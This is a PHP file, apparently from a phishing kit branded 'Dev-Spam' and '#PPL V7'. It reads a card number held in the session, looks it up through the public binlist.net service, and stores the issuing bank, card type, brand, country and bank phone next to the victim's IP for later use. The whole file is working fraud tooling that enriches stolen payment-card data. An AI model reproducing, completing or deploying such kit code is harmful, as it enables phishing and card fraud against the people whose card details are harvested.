<?php
/*
///////////////////////////////////////////////////////////////
//            _    _  _ ______   __      ___ __      __      //
//      /\   | |  | || |____  |  \ \    / / |\ \    / /      //
//     /  \  | | _| || |_  / /____\ \  / /| |_\ \  / /       //
//    / /\ \ | |/ /__   _|/ /______\ \/ / | '_ \ \/ /        // 
//   / ____ \|   <   | | / /        \  /  | |_) \  /         // 
//  /_/    \_\_|\_\  |_|/_/          \/   |_.__/ \/          // 
//                   _     Dev-Spam     _                    //
//                        #PPL V7                            //
///////////////////////////////////////////////////////////////  	
*/                                                     



session_start();
///////////////////////////////// BIN CHECKER  /////////////////////////////////
$BIN_LOOKUP  = str_replace(' ', '', $_SESSION['_cardnumber_']);
$DST_BIN    = @json_decode(file_get_contents("https://lookup.binlist.net/".$BIN_LOOKUP.""));
$BIN_CARD    = $DST_BIN->scheme;
$BIN_BANK    = $DST_BIN->bank -> name;
$BIN_TYPE    = $DST_BIN->type;
$BIN_LEVEL   = $DST_BIN->brand;
$BIN_CNTRCODE= $DST_BIN->country -> alpha2;
$BIN_WEBSITE = $DST_BIN->bank -> url;
$BIN_PHONE   = $DST_BIN->bank -> phone;
$BIN_COUNTRY = $DST_BIN->country -> name;
///////////////////////////////// SESSION FOR SOME VAR  /////////////////////////////////
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_bank_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
///////////////////////////////// BIN Lookup /////////////////////////
?>
